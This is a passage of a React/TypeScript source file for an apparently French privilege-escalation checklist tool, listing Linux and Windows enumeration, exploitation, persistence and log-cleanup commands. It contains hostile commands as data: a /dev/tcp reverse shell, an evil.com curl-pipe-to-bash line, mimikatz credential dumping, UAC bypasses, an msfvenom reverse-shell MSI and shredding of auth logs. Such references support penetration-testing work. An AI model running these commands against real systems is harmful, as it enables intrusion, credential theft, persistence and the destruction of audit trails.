import React, { useMemo, useRef, useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { usePrivescStore, PrivescMode } from '@/stores/privescStore';
import { createPortal } from 'react-dom';
import {
  Shield,
  Wrench,
  Search,
  RefreshCw,
  Clipboard,
  Upload,
  Download,
  ExternalLink,
  Info,
} from 'lucide-react';
import InfoModal from '@/components/ui/InfoModal';

const copyText = async (text: string) => {
  try { await navigator.clipboard.writeText(text); } catch {}
};

type ItemDetails = {
  description?: string;
  commands?: string[];
  lookFors?: string[]; // ce qu'il faut chercher
  expected?: string[]; // sorties attendues / indices
};

const DETAILS: Record<string, ItemDetails> = {
  // Linux
  uname: {
    description: "Version noyau et distribution pour identifier des exploits ciblés.",
    commands: ["uname -a", "lsb_release -a 2>/dev/null || cat /etc/os-release"],
    lookFors: ["Kernel trop ancien", "Distribution non patchée"],
    expected: ["Linux target 5.x …", "Ubuntu 20.04 …"],
  },
  id: {
    description: "Contexte utilisateur et privilèges potentiels.",
    commands: ["id", "groups", "sudo -l 2>/dev/null"],
    lookFors: ["(sudo) NOPASSWD", "groupes sensibles (docker, lxd, adm)"],
    expected: ["uid=1000(user) gid=1000(user) groups=docker"],
  },
  proc: {
    description: "Processus et services pour découvertes d'angles d'attaque.",
    commands: ["ps aux", "ss -tunlp", "systemctl list-units --type=service"],
    lookFors: ["services tournant en root", "ports internes", "binaires custom"],
    expected: ["/opt/app/service (root)", "127.0.0.1:8080"],
  },
  files: {
    description: "Fichiers SUID/SGID intéressants pour escalade.",
    commands: ["find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null"],
    lookFors: ["binaire custom SUID", "GTFOBins SUID"],
    expected: ["-rwsr-xr-x root root /usr/bin/pythonX"],
  },
  capabilities: {
    description: "Capacités Linux abusables (cap_setuid…).",
    commands: ["getcap -r / 2>/dev/null"],
    lookFors: ["cap_setuid=ep", "cap_dac_read_search=ep"],
    expected: ["/usr/bin/python3 = cap_setuid+ep"],
  },
  cron: {
    description: "Cron modifiable permettant l'exécution planifiée.",
    commands: ["crontab -l", "ls -la /etc/cron*", "systemctl list-timers"],
    lookFors: ["script cron éditable", "chemin écrivable"],
    expected: ["/etc/cron.daily/backup.sh (user: root, writable: user)"],
  },
  docker: {
    description: "Membre du groupe docker -> escalade via conteneur privilégié.",
    commands: ["id | grep -qi docker && echo 'in docker group'"],
    lookFors: ["groupe docker présent"],
    expected: ["groups=... docker ..."],
  },
  nfs: {
    description: "Montages NFS avec no_root_squash permettant root local.",
    commands: ["cat /etc/exports 2>/dev/null", "mount | grep -i nfs"],
    lookFors: ["no_root_squash", "rw"],
    expected: ["/srv/share *(rw,sync,no_root_squash)"],
  },
  path: {
    description: "Répertoires en PATH écrivable (hijack).",
    commands: ["echo $PATH", "ls -ld $(echo $PATH | tr ':' ' ')"],
    lookFors: ["writable dans PATH", "scripts appelant des binaires sans chemin absolu"],
    expected: ["drwxrwxr-x user /usr/local/bin"],
  },
  env: {
    description: "Variables d'environnement contenant des informations sensibles.",
    commands: ["env", "printenv", "cat /proc/*/environ 2>/dev/null"],
    lookFors: ["API keys", "passwords", "tokens", "database credentials"],
    expected: ["API_KEY=abc123", "DB_PASSWORD=secret"],
  },
  history: {
    description: "Historique des commandes pour découvrir des patterns et credentials.",
    commands: ["history", "cat ~/.bash_history", "cat ~/.zsh_history"],
    lookFors: ["passwords en clair", "commandes sudo", "connexions SSH"],
    expected: ["sudo su -", "ssh user@host", "mysql -u root -p"],
  },
  network: {
    description: "Interfaces réseau et connexions pour identifier des services cachés.",
    commands: ["ip addr", "netstat -tulpn", "ss -tulpn", "lsof -i"],
    lookFors: ["ports internes", "services cachés", "connexions suspectes"],
    expected: ["127.0.0.1:8080", "0.0.0.0:22", "tcp 0.0.0.0:80"],
  },
  ld_preload: {
    description: "LD_PRELOAD hijacking pour intercepter les appels système.",
    commands: ["echo $LD_PRELOAD", "ldd /bin/ls", "readelf -d /bin/ls"],
    lookFors: ["LD_PRELOAD défini", "bibliothèques chargées dynamiquement"],
    expected: ["LD_PRELOAD=/tmp/lib.so", "libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6"],
  },
  ld_library_path: {
    description: "Manipulation du LD_LIBRARY_PATH pour charger des bibliothèques malveillantes.",
    commands: ["echo $LD_LIBRARY_PATH", "ldd /usr/bin/id", "ldconfig -p"],
    lookFors: ["LD_LIBRARY_PATH défini", "chemins écrivables dans LD_LIBRARY_PATH"],
    expected: ["LD_LIBRARY_PATH=/tmp:/usr/lib"],
  },
  python_path: {
    description: "PYTHONPATH hijacking pour charger des modules Python malveillants.",
    commands: ["echo $PYTHONPATH", "python -c 'import sys; print(sys.path)'"],
    lookFors: ["PYTHONPATH défini", "chemins écrivables dans PYTHONPATH"],
    expected: ["PYTHONPATH=/tmp:/usr/lib/python3.8"],
  },
  profile: {
    description: "Fichiers de profil modifiables pour exécution de code au login.",
    commands: ["ls -la ~/.bashrc ~/.profile ~/.bash_profile", "cat ~/.bashrc"],
    lookFors: ["fichiers écrivables", "commandes suspectes dans les profils"],
    expected: ["-rw-rw-r-- user user .bashrc", "curl http://evil.com/shell.sh | bash"],
  },
  sudo: {
    description: "Configuration sudo vulnérable permettant l'escalade de privilèges.",
    commands: ["sudo -l", "cat /etc/sudoers", "grep -r NOPASSWD /etc/sudoers.d/"],
    lookFors: ["NOPASSWD", "ALL=(ALL) NOPASSWD", "sudoers mal configuré"],
    expected: ["(ALL) NOPASSWD: /bin/bash", "user ALL=(ALL) NOPASSWD: ALL"],
  },
  groups: {
    description: "Groupes sensibles permettant l'escalade de privilèges.",
    commands: ["groups", "id", "getent group docker", "getent group lxd"],
    lookFors: ["docker", "lxd", "adm", "wheel", "sudo"],
    expected: ["groups=... docker ...", "groups=... lxd ..."],
  },
  acl: {
    description: "Permissions ACL (Access Control Lists) pour identifier des accès spéciaux.",
    commands: ["getfacl /", "getfacl /etc", "getfacl /home"],
    lookFors: ["ACL avec permissions étendues", "user:user:rwx"],
    expected: ["user:user:rwx", "group:docker:r-x"],
  },
  systemd: {
    description: "Services systemd vulnérables ou mal configurés.",
    commands: ["systemctl list-units --type=service", "systemctl status", "systemctl show"],
    lookFors: ["services en mode user", "services avec permissions faibles"],
    expected: ["User=user", "Group=user", "ExecStart=/usr/bin/service"],
  },
  init_scripts: {
    description: "Scripts d'initialisation modifiables pour persistance.",
    commands: ["ls -la /etc/init.d/", "ls -la /etc/rc*.d/", "cat /etc/inittab"],
    lookFors: ["scripts écrivables", "scripts avec permissions faibles"],
    expected: ["-rwxrwxrwx root root myservice", "S:2345:respawn:/bin/bash"],
  },
  timers: {
    description: "Timers systemd pour exécution planifiée de tâches.",
    commands: ["systemctl list-timers", "systemctl cat timer-name", "ls -la /etc/systemd/system/timers.target.wants/"],
    lookFors: ["timers actifs", "timers avec permissions faibles"],
    expected: ["active (waiting) timer.timer", "OnCalendar=*:0/5"],
  },
  at_jobs: {
    description: "Tâches at pour exécution planifiée de commandes.",
    commands: ["atq", "at -l", "ls -la /var/spool/at/"],
    lookFors: ["tâches at en attente", "fichiers at écrivables"],
    expected: ["1 Mon Jan 1 10:00:00 2024 a user", "a0000101.12345"],
  },
  cgroups: {
    description: "cgroups et namespaces pour identifier des conteneurs ou environnements isolés.",
    commands: ["cat /proc/1/cgroup", "lsns", "cat /proc/self/ns/"],
    lookFors: ["cgroup v1/v2", "namespaces isolés", "conteneurs"],
    expected: ["0::/", "cgroup2 on /sys/fs/cgroup type cgroup2"],
  },
  seccomp: {
    description: "Seccomp et AppArmor pour identifier les restrictions de sécurité.",
    commands: ["cat /proc/self/status | grep Seccomp", "aa-status", "apparmor_status"],
    lookFors: ["Seccomp: 0", "AppArmor profiles actifs", "restrictions de sécurité"],
    expected: ["Seccomp: 0", "apparmor module is loaded"],
  },
  ssh_keys: {
    description: "Clés SSH autorisées pour accès à distance.",
    commands: ["ls -la ~/.ssh/", "cat ~/.ssh/authorized_keys", "cat ~/.ssh/id_*"],
    lookFors: ["clés SSH publiques", "authorized_keys écrivable"],
    expected: ["ssh-rsa AAAAB3NzaC1yc2E...", "-rw-rw-r-- user user authorized_keys"],
  },
  crontab_persist: {
    description: "Crontab de persistance pour maintenir l'accès.",
    commands: ["crontab -l", "cat /etc/crontab", "ls -la /etc/cron.*/"],
    lookFors: ["crontab écrivable", "tâches de persistance"],
    expected: ["* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'"],
  },
  backdoors: {
    description: "Backdoors système pour maintenir l'accès persistant.",
    commands: ["ls -la /etc/passwd", "grep -v '^#' /etc/passwd", "cat /etc/shadow"],
    lookFors: ["comptes utilisateur suspects", "shells non standards"],
    expected: ["backdoor:x:0:0:root:/root:/bin/bash", "/bin/bash"],
  },
  logs_cleanup: {
    description: "Nettoyage des logs pour effacer les traces.",
    commands: ["ls -la /var/log/", "find /var/log -name '*.log'", "journalctl --list-boots"],
    lookFors: ["logs écrivables", "logs avec permissions faibles"],
    expected: ["-rw-rw-rw- root root auth.log", "journalctl --vacuum-time=1s"],
  },
  traces: {
    description: "Suppression des traces d'activité malveillante.",
    commands: ["history -c", "unset HISTFILE", "shred -vfz -n 3 /var/log/auth.log"],
    lookFors: ["historique effacé", "logs supprimés", "traces nettoyées"],
    expected: ["history: 0", "HISTFILE unset", "shred: /var/log/auth.log: pass 1/4"],
  },

  // Windows
  whoami: {
    description: "Contexte utilisateur et privilèges/tokens.",
    commands: ["whoami /all"],
    lookFors: ["SeImpersonate/SeAssignPrimaryToken", "groupes Admin/Backup"],
    expected: ["Privilege Name: SeImpersonatePrivilege"],
  },
  systeminfo: {
    description: "Version OS et patchs -> mapping CVE/EoP.",
    commands: ["systeminfo"],
    lookFors: ["build ancien", "service pack manquant"],
    expected: ["OS Version: 10.0.17763"],
  },
  net: {
    description: "Services / shares / sessions utiles.",
    commands: ["net start", "net share", "query user"],
    lookFors: ["service custom", "share accessible"],
    expected: ["Share name: C$", "Service: CustomSvc"]
  },
  qfe: {
    description: "Hotfix installés: vérifier si EoP patchée.",
    commands: ["wmic qfe list full"],
    lookFors: ["KB absent pour vuln connue"],
    expected: ["KB5006365 missing"],
  },
  dll_hijack: {
    description: "DLL manquante dans PATH -> charge notre DLL.",
    commands: ["Procmon filter 'NAME NOT FOUND'", "Autoruns (Logon/Services)"],
    lookFors: ["répertoire écrivable dans ordre de recherche"],
    expected: ["LoadLibrary('missing.dll')"]
  },
  unquoted: {
    description: "Chemin de service non quoté -> drop binaire dans chemin partiel.",
    commands: ["wmic service get name,displayname,pathname,startmode | findstr /i 'Auto' | findstr /i /v 'C:\\Windows\\'", "icacls C:\\Program Files\\Vulnerable /grant Users:F"],
    lookFors: ["dossier écrivable avant l'exécutable"],
    expected: ["Service started with our binary"],
  },
  schtasks: {
    description: "Tâches planifiées modifiables/détournables.",
    commands: ["schtasks /query /fo LIST /v", "Get-ScheduledTask"],
    lookFors: ["Action/Arguments modifiables", "binaire dans chemin écrivable"],
    expected: ["Task runs our payload"],
  },
  alwaysinstall: {
    description: "AlwaysInstallElevated -> MSI en SYSTEM.",
    commands: ["reg query HKCU\\...AlwaysInstallElevated", "reg query HKLM\\...AlwaysInstallElevated"],
    lookFors: ["Valeur 1 sur HKCU et HKLM"],
    expected: ["Both keys = 0x1"],
  },
  seimpersonate: {
    description: "Token SeImpersonate -> Juicy/RoguePotato.",
    commands: ["whoami /all", "JuicyPotato.exe -t *"],
    lookFors: ["SeImpersonate présent"],
    expected: ["NT AUTHORITY\\SYSTEM"],
  },
  backup: {
    description: "SeBackup/SeRestore -> lecture SAM/SECURITY.",
    commands: ["reg save HKLM\\SAM C:\\temp\\sam.save", "reg save HKLM\\SYSTEM C:\\temp\\system.save"],
    lookFors: ["Privilèges présents"],
    expected: ["Successfully saved registry key"],
  },
  uac: {
    description: "Bypass UAC selon contexte (non élévation).",
    commands: ["Check UAC level", "fodhelper/elevated COM hijack"],
    lookFors: ["Installations autorisées"],
    expected: ["Exécution élevée de notre appli"],
  },
  env_vars: {
    description: "Variables d'environnement Windows contenant des informations sensibles.",
    commands: ["set", "Get-ChildItem Env:", "reg query \"HKCU\\Environment\""],
    lookFors: ["API keys", "passwords", "tokens", "database credentials"],
    expected: ["API_KEY=abc123", "DB_PASSWORD=secret", "JWT_TOKEN=eyJ..."],
  },
  processes: {
    description: "Processus en cours d'exécution pour identifier des services vulnérables.",
    commands: ["tasklist", "Get-Process", "wmic process list"],
    lookFors: ["processus avec privilèges élevés", "services vulnérables", "processus suspects"],
    expected: ["svchost.exe", "winlogon.exe", "lsass.exe"],
  },
  drivers: {
    description: "Drivers installés pour identifier des vulnérabilités kernel.",
    commands: ["driverquery", "Get-WmiObject Win32_SystemDriver", "sc query type= driver"],
    lookFors: ["drivers non signés", "drivers vulnérables", "drivers suspects"],
    expected: ["Microsoft Corporation", "Third Party Driver", "Unknown Publisher"],
  },
  debug: {
    description: "SeDebugPrivilege pour accéder aux processus d'autres utilisateurs.",
    commands: ["whoami /priv", "privilege::debug", "sekurlsa::logonpasswords"],
    lookFors: ["SeDebugPrivilege Enabled", "privilege debug"],
    expected: ["SeDebugPrivilege", "Enabled"],
  },
  tcb: {
    description: "SeTcbPrivilege pour agir en tant que partie du système.",
    commands: ["whoami /priv", "privilege::tcb", "lsadump::sam"],
    lookFors: ["SeTcbPrivilege Enabled", "privilege tcb"],
    expected: ["SeTcbPrivilege", "Enabled"],
  },
  load_driver: {
    description: "SeLoadDriverPrivilege pour charger des drivers malveillants.",
    commands: ["whoami /priv", "privilege::driver", "sc create driver binPath= C:\\temp\\driver.sys"],
    lookFors: ["SeLoadDriverPrivilege Enabled", "privilege load driver"],
    expected: ["SeLoadDriverPrivilege", "Enabled"],
  },
  service_perms: {
    description: "Permissions de service modifiables pour escalade de privilèges.",
    commands: ["sc qc service_name", "icacls C:\\Windows\\System32\\service.exe", "accesschk.exe -uwcqv service_name"],
    lookFors: ["SERVICE_ALL_ACCESS", "permissions modifiables", "accès en écriture"],
    expected: ["SERVICE_ALL_ACCESS", "FULL ACCESS"],
  },
  service_binary: {
    description: "Binaire de service modifiable pour exécution de code malveillant.",
    commands: ["sc qc service_name", "icacls C:\\Windows\\System32\\service.exe", "dir C:\\Windows\\System32\\service.exe"],
    lookFors: ["binaire écrivable", "permissions faibles", "accès en écriture"],
    expected: ["Everyone:(F)", "Users:(F)", "Authenticated Users:(F)"],
  },
  service_registry: {
    description: "Registry de service modifiable pour redirection de binaire.",
    commands: ["reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\service_name\"", "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\service_name\\Parameters\""],
    lookFors: ["clés registry écrivables", "ImagePath modifiable", "Parameters écrivables"],
    expected: ["ImagePath", "Parameters", "REG_SZ"],
  },
  saved_creds: {
    description: "Saved Credentials stockées dans Windows pour vol d'identifiants.",
    commands: ["cmdkey /list", "vaultcmd /list", "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*"],
    lookFors: ["credentials sauvegardées", "vault entries", "fichiers de credentials"],
    expected: ["Target: domain:target=server", "Vault: Windows Credentials"],
  },
  mremoteng: {
    description: "mRemoteNG et autres gestionnaires RDP pour vol d'identifiants.",
    commands: ["dir /s /b C:\\Users\\*\\AppData\\Roaming\\mRemoteNG\\*", "dir /s /b C:\\Users\\*\\AppData\\Roaming\\RDP Manager\\*"],
    lookFors: ["fichiers de configuration", "bases de données", "fichiers de connexion"],
    expected: ["connections.xml", "confCons.xml", "connections.json"],
  },
  file_contents: {
    description: "Contenu de fichiers sensibles pour vol d'identifiants.",
    commands: ["dir /s /b C:\\Users\\*\\*.txt", "findstr /s /i \"password\" C:\\Users\\*\\*", "type C:\\Users\\*\\Desktop\\*"],
    lookFors: ["fichiers texte avec passwords", "fichiers de configuration", "notes avec credentials"],
    expected: ["password=secret", "username=admin", "api_key=abc123"],
  },
  browser_creds: {
    description: "Identifiants navigateur pour vol de credentials.",
    commands: ["dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\logins.json"],
    lookFors: ["bases de données de login", "fichiers de credentials", "profils de navigateur"],
    expected: ["Login Data", "logins.json", "Web Data"],
  },
  wifi_creds: {
    description: "Identifiants WiFi pour accès réseau.",
    commands: ["netsh wlan show profiles", "netsh wlan export profile name=\"profile_name\" key=clear", "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Wlansvc\\Profiles\\*"],
    lookFors: ["profils WiFi", "clés WiFi", "fichiers de configuration WiFi"],
    expected: ["keyMaterial", "SSID", "WPA2PSK"],
  },
  vault: {
    description: "Windows Vault pour stockage de credentials.",
    commands: ["vaultcmd /list", "vaultcmd /listcreds:Windows", "vaultcmd /listcreds:Web"],
    lookFors: ["vault entries", "credentials stockées", "entrées de vault"],
    expected: ["Vault: Windows Credentials", "Vault: Web Credentials"],
  },
  fodhelper: {
    description: "Fodhelper.exe bypass UAC pour élévation de privilèges.",
    commands: ["reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f", "fodhelper.exe"],
    lookFors: ["registry modifiable", "fodhelper.exe disponible", "UAC bypass possible"],
    expected: ["The operation completed successfully", "cmd.exe opened as admin"],
  },
  sdclt: {
    description: "sdclt.exe bypass UAC pour élévation de privilèges.",
    commands: ["reg add \"HKCU\\Software\\Classes\\exefile\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f", "sdclt.exe"],
    lookFors: ["registry modifiable", "sdclt.exe disponible", "UAC bypass possible"],
    expected: ["The operation completed successfully", "cmd.exe opened as admin"],
  },
  computerdefaults: {
    description: "ComputerDefaults.exe bypass UAC pour élévation de privilèges.",
    commands: ["reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f", "computerdefaults.exe"],
    lookFors: ["registry modifiable", "computerdefaults.exe disponible", "UAC bypass possible"],
    expected: ["The operation completed successfully", "cmd.exe opened as admin"],
  },
  uac_bypass_tools: {
    description: "Outils de bypass UAC pour élévation de privilèges.",
    commands: ["UACMe.exe", "BypassUAC.exe", "Invoke-UACBypass.ps1"],
    lookFors: ["outils de bypass UAC", "scripts PowerShell", "exécutables de bypass"],
    expected: ["UAC bypass successful", "Administrator privileges obtained"],
  },
  msi_creation: {
    description: "Création de MSI malveillant pour AlwaysInstallElevated.",
    commands: ["msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f msi -o payload.msi", "msfconsole -q -x 'use exploit/windows/local/always_install_elevated'"],
    lookFors: ["MSI créé", "payload MSI", "exploit AlwaysInstallElevated"],
    expected: ["payload.msi created", "MSI payload generated"],
  },
  msi_execution: {
    description: "Exécution de MSI en SYSTEM avec AlwaysInstallElevated.",
    commands: ["msiexec /quiet /qn /i payload.msi", "msiexec /quiet /qn /i payload.msi /norestart"],
    lookFors: ["MSI exécuté", "installation réussie", "privilèges SYSTEM"],
    expected: ["Installation completed successfully", "SYSTEM privileges obtained"],
  },
  applocker: {
    description: "Contournement AppLocker pour exécution de code restreint.",
    commands: ["Get-AppLockerPolicy -Effective", "Get-AppLockerPolicy -Local", "applocker.msc"],
    lookFors: ["AppLocker désactivé", "règles AppLocker", "exceptions AppLocker"],
    expected: ["AppLocker is not configured", "No AppLocker rules found"],
  },
  wdac: {
    description: "Windows Defender Application Control pour contournement de restrictions.",
    commands: ["Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard", "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-CodeIntegrity/Operational'}"],
    lookFors: ["WDAC désactivé", "Code Integrity désactivé", "Device Guard désactivé"],
    expected: ["DeviceGuard not enabled", "Code Integrity not enforced"],
  },
  powershell_constrained: {
    description: "PowerShell contraint pour contournement de restrictions.",
    commands: ["Get-ExecutionPolicy", "Get-ExecutionPolicy -List", "powershell.exe -ExecutionPolicy Bypass"],
    lookFors: ["ExecutionPolicy restrictif", "PowerShell contraint", "restrictions d'exécution"],
    expected: ["Restricted", "AllSigned", "RemoteSigned"],
  },
  bypass_techniques: {
    description: "Techniques de bypass pour contourner les restrictions de sécurité.",
    commands: ["powershell.exe -ExecutionPolicy Bypass -File script.ps1", "cmd.exe /c powershell.exe -ExecutionPolicy Bypass", "rundll32.exe javascript:alert('test')"],
    lookFors: ["techniques de bypass", "méthodes d'évasion", "contournements possibles"],
    expected: ["Bypass successful", "Restrictions bypassed", "Code executed"],
  },
  startup_folders: {
    description: "Dossiers de démarrage pour persistance et exécution automatique.",
    commands: ["dir \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", "dir \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""],
    lookFors: ["dossiers de démarrage", "fichiers de démarrage", "exécutables de démarrage"],
    expected: ["startup.exe", "malware.exe", "backdoor.exe"],
  },
  registry_startup: {
    description: "Registry de démarrage pour persistance et exécution automatique.",
    commands: ["reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"", "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""],
    lookFors: ["entrées de démarrage", "clés de démarrage", "exécutables de démarrage"],
    expected: ["malware.exe", "backdoor.exe", "C:\\temp\\payload.exe"],
  },
  wmi_events: {
    description: "Événements WMI pour persistance et exécution automatique.",
    commands: ["wmic /namespace:\\\\root\\subscription path __EventFilter get Name", "wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer get Name"],
    lookFors: ["filtres d'événements WMI", "consommateurs d'événements WMI", "persistance WMI"],
    expected: ["EventFilter", "CommandLineEventConsumer", "WMI persistence"],
  },
  eternal_blue: {
    description: "EternalBlue / SMBGhost pour exploitation de vulnérabilités SMB.",
    commands: ["nmap --script smb-vuln-ms17-010 -p445 target", "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue'"],
    lookFors: ["SMB vulnérable", "MS17-010", "EternalBlue exploitable"],
    expected: ["VULNERABLE", "MS17-010 detected", "EternalBlue successful"],
  },
  blue_screen: {
    description: "BlueKeep / RDP pour exploitation de vulnérabilités RDP.",
    commands: ["nmap --script rdp-vuln-ms12-020 -p3389 target", "msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce'"],
    lookFors: ["RDP vulnérable", "BlueKeep", "CVE-2019-0708"],
    expected: ["VULNERABLE", "BlueKeep detected", "RDP exploit successful"],
  },
  printnightmare: {
    description: "PrintNightmare pour exploitation de vulnérabilités d'impression.",
    commands: ["nmap --script smb-vuln-printnightmare -p445 target", "msfconsole -q -x 'use exploit/windows/smb/cve_2021_1675_printnightmare'"],
    lookFors: ["Print Spooler vulnérable", "PrintNightmare", "CVE-2021-1675"],
    expected: ["VULNERABLE", "PrintNightmare detected", "Print Spooler exploit successful"],
  },
  zerologon: {
    description: "Zerologon pour exploitation de vulnérabilités Active Directory.",
    commands: ["nmap --script smb-vuln-zerologon -p445 target", "msfconsole -q -x 'use auxiliary/admin/dcerpc/cve_2020_1472_zerologon'"],
    lookFors: ["Domain Controller vulnérable", "Zerologon", "CVE-2020-1472"],
    expected: ["VULNERABLE", "Zerologon detected", "DC exploit successful"],
  },
  petitpotam: {
    description: "PetitPotam pour exploitation de vulnérabilités Active Directory.",
    commands: ["nmap --script smb-vuln-petitpotam -p445 target", "msfconsole -q -x 'use auxiliary/admin/dcerpc/cve_2021_36942_petitpotam'"],
    lookFors: ["Domain Controller vulnérable", "PetitPotam", "CVE-2021-36942"],
    expected: ["VULNERABLE", "PetitPotam detected", "DC exploit successful"],
  },
  runas: {
    description: "RunAs / RunAsUser pour exécution de code avec d'autres privilèges.",
    commands: ["runas /user:admin cmd", "runas /user:domain\\admin cmd", "runas /savecred /user:admin cmd"],
    lookFors: ["RunAs disponible", "credentials sauvegardées", "utilisateurs avec privilèges"],
    expected: ["Enter the password for admin", "cmd opened as admin"],
  },
  token_manipulation: {
    description: "Manipulation de tokens pour escalade de privilèges.",
    commands: ["incognito.exe list_tokens -u", "incognito.exe execute -H \"NT AUTHORITY\\SYSTEM\" cmd", "mimikatz.exe \"token::elevate\""],
    lookFors: ["tokens disponibles", "tokens SYSTEM", "escalade de tokens"],
    expected: ["NT AUTHORITY\\SYSTEM", "Token elevated", "SYSTEM privileges obtained"],
  },
  parent_process: {
    description: "Parent Process ID Spoofing pour masquer l'exécution de code.",
    commands: ["powershell.exe -Command \"Start-Process -FilePath 'cmd.exe' -ArgumentList '/c whoami' -WindowStyle Hidden\"", "parentpidspoof.exe -p 1234 -c cmd.exe"],
    lookFors: ["Parent Process ID Spoofing", "masquage de processus", "évasion de détection"],
    expected: ["Process started with spoofed parent", "Parent PID spoofed"],
  },
  com_hijacking: {
    description: "COM Hijacking pour exécution de code malveillant.",
    commands: ["reg add \"HKCU\\Software\\Classes\\CLSID\\{guid}\\InprocServer32\" /ve /d \"C:\\temp\\malware.dll\" /f", "reg query \"HKCU\\Software\\Classes\\CLSID\\{guid}\""],
    lookFors: ["COM objects modifiables", "CLSID écrivables", "COM hijacking possible"],
    expected: ["The operation completed successfully", "COM object hijacked"],
  },
  dll_proxying: {
    description: "DLL Proxying pour redirection d'appels de fonctions.",
    commands: ["copy original.dll original.dll.backup", "copy malicious.dll original.dll", "copy proxy.dll original.dll"],
    lookFors: ["DLLs modifiables", "DLLs de proxy", "redirection de fonctions"],
    expected: ["DLL proxied successfully", "Function calls redirected"],
  },
};

const THEMES: Record<PrivescMode, { id: string; title: string; items: { id: string; label: string; helpKey?: string }[] }[]> = {
  linux: [
    {
      id: 'collecte_info',
      title: '01 - Collecte d\'informations',
      items: [
        { id: 'uname', label: 'uname -a / lsb_release -a' },
        { id: 'id', label: 'id / groups / sudo -l' },
        { id: 'proc', label: 'ps aux / services / ports ouverts' },
        { id: 'env', label: 'Variables d\'environnement sensibles' },
        { id: 'history', label: 'Historique des commandes' },
        { id: 'network', label: 'Interfaces réseau et connexions' },
      ],
    },
    {
      id: 'escalade_env',
      title: '02 - Escalade environnement',
      items: [
        { id: 'path', label: 'PATH hijack / writable dirs' },
        { id: 'ld_preload', label: 'LD_PRELOAD hijacking' },
        { id: 'ld_library_path', label: 'LD_LIBRARY_PATH manipulation' },
        { id: 'python_path', label: 'PYTHONPATH hijacking' },
        { id: 'profile', label: 'Fichiers de profil (.bashrc, .profile)' },
      ],
    },
    {
      id: 'escalade_perms',
      title: '03 - Escalade permissions',
      items: [
        { id: 'files', label: 'Fichiers SUID/SGID intéressants' },
        { id: 'capabilities', label: 'Linux capabilities (getcap -r /)' },
        { id: 'sudo', label: 'Configuration sudo vulnérable' },
        { id: 'groups', label: 'Groupes sensibles (docker, lxd, adm)' },
        { id: 'acl', label: 'Permissions ACL (getfacl)' },
      ],
    },
    {
      id: 'services_cron',
      title: '04 - Services & Cron',
      items: [
        { id: 'cron', label: 'Cron modifiable' },
        { id: 'systemd', label: 'Services systemd vulnérables' },
        { id: 'init_scripts', label: 'Scripts d\'initialisation' },
        { id: 'timers', label: 'Timers systemd' },
        { id: 'at_jobs', label: 'Tâches at' },
      ],
    },
    {
      id: 'mecanismes_internes',
      title: '05 - Mécanismes internes',
      items: [
        { id: 'kernel_ver', label: 'Version kernel / exploits connus' },
        { id: 'dirty', label: 'Dirty* (Cow/Pipe/…) si applicable' },
        { id: 'docker', label: 'Docker/LXC groupe docker / sockets' },
        { id: 'nfs', label: 'NFS (no_root_squash ?) / montages' },
        { id: 'cgroups', label: 'cgroups et namespaces' },
        { id: 'seccomp', label: 'Seccomp et AppArmor' },
      ],
    },
    {
      id: 'persistance_nettoyage',
      title: '06 - Persistance et nettoyage',
      items: [
        { id: 'ssh_keys', label: 'Clés SSH autorisées' },
        { id: 'crontab_persist', label: 'Crontab de persistance' },
        { id: 'backdoors', label: 'Backdoors système' },
        { id: 'logs_cleanup', label: 'Nettoyage des logs' },
        { id: 'traces', label: 'Suppression des traces' },
      ],
    },
  ],
  windows: [
    {
      id: 'enumeration_initiale',
      title: '01 - Énumération initiale',
      items: [
        { id: 'whoami', label: 'whoami /priv /groups' },
        { id: 'systeminfo', label: 'systeminfo / wmic qfe' },
        { id: 'net', label: 'services, sessions, shares' },
        { id: 'env_vars', label: 'Variables d\'environnement sensibles' },
        { id: 'processes', label: 'Processus en cours d\'exécution' },
        { id: 'drivers', label: 'Drivers installés' },
      ],
    },
    {
      id: 'exploitation_privs_user',
      title: '02 - Exploitation privilèges utilisateur',
      items: [
        { id: 'seimpersonate', label: 'SeImpersonate / JuicyPotato / RoguePotato' },
        { id: 'backup', label: 'SeBackup/SeRestore (SAM/SECURITY backup)' },
        { id: 'debug', label: 'SeDebugPrivilege' },
        { id: 'tcb', label: 'SeTcbPrivilege' },
        { id: 'load_driver', label: 'SeLoadDriverPrivilege' },
      ],
    },
    {
      id: 'escalade_services',
      title: '03 - Escalade via services',
      items: [
        { id: 'dll_hijack', label: 'DLL Hijacking' },
        { id: 'unquoted', label: 'Unquoted Service Path' },
        { id: 'service_perms', label: 'Permissions de service modifiables' },
        { id: 'service_binary', label: 'Binaire de service modifiable' },
        { id: 'service_registry', label: 'Registry de service modifiable' },
      ],
    },
    {
      id: 'vol_identifiants',
      title: '04 - Vol d\'identifiants',
      items: [
        { id: 'saved_creds', label: 'Saved Credentials (cmdkey)' },
        { id: 'mremoteng', label: 'mRemoteNG / RDP Manager' },
